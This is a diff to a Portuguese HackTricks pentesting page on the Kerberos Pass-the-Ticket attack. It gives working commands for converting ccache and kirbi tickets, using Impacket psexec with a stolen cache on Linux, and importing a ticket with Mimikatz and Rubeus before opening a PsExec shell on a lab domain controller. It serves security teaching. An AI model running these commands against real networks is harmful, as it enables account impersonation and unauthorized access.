@@ -2,42 +2,51 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Pass The Ticket (PTT)
+## Visão geral
 
-No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de sua senha ou de seus valores de hash. Esse ticket roubado é então usado para **personificar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.<sup>[[1]](#references)</sup>
+Em um ataque Pass-the-Ticket (PtT), um adversário usa um ticket Kerberos roubado para se autenticar como o principal do ticket sem possuir a senha dessa conta. Um ticket-granting ticket (TGT) pode ser usado para solicitar service tickets, enquanto um service ticket roubado é limitado ao serviço de destino e ao período de validade.<sup>[[1]](#references)</sup>
 
-**Leia**:
+Para conhecer técnicas de aquisição de tickets, consulte:
 
 - [Coletando tickets do Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
 - [Coletando tickets do Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Trocando tickets do Linux e do Windows entre plataformas**
+## Convertendo formatos de tickets do Linux e do Windows
 
-A ferramenta [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) converte formatos de tickets usando apenas o próprio ticket e um arquivo de saída.
+Os caches Kerberos geralmente aparecem como arquivos MIT `ccache` no Linux e arquivos `.kirbi` no Windows. `ticket_converter` converte entre esses formatos usando um ticket de entrada e um caminho de saída.<sup>[[2]](#references)</sup>
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
-Converting ccache => kirbi
-
+# Expected message: Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
-Converting kirbi => ccache
+# Expected message: Converting kirbi => ccache
 ```
-No Windows, o [Kekeo](https://github.com/gentilkiwi/kekeo) pode ser usado.
+O Kekeo também fornece ferramentas para tickets Kerberos no Windows.<sup>[[3]](#references)</sup>
 
-### Pass The Ticket Attack
-```bash:Linux
+## Usando um Ticket
+
+No Linux, aponte `KRB5CCNAME` para o cache e instrua um cliente Impacket a usar Kerberos sem solicitar uma senha:<sup>[[4]](#references)</sup>
+```bash
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
 ```
-
-```bash:Windows
-#Load the ticket in memory using mimikatz or Rubeus
+No Windows, Mimikatz ou Rubeus podem importar um ticket `.kirbi` para a sessão de logon atual. Use `klist` para inspecionar o cache resultante.<sup>[[5]](#references)[[6]](#references)</sup>
+```powershell
 mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
-.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
-klist #List tickets in cache to cehck that mimikatz has loaded the ticket
+.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
+klist
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-## Referências
+A importação de tickets não concede privilégios além daqueles representados pelo ticket e pela política de autorização do serviço de destino. Tickets expirados, revogados, malformados ou com escopo incorreto podem falhar.<sup>[[1]](#references)</sup>
 
-- [1] [Kerberos (II): Como atacar o Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+Para obter um contexto mais amplo sobre ataques Kerberos e técnicas relacionadas de aquisição de tickets, consulte o guia de ataques Kerberos da Tarlogic.<sup>[[7]](#references)</sup>
 
+## References
+
+- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
+- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
+- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
+- [4] [Fortra - Exemplos do Impacket](https://github.com/fortra/impacket/tree/master/examples)
+- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
+- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
+- [7] [Tarlogic - Técnicas de ataque ao Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 {{#include ../../banners/hacktricks-training.md}}
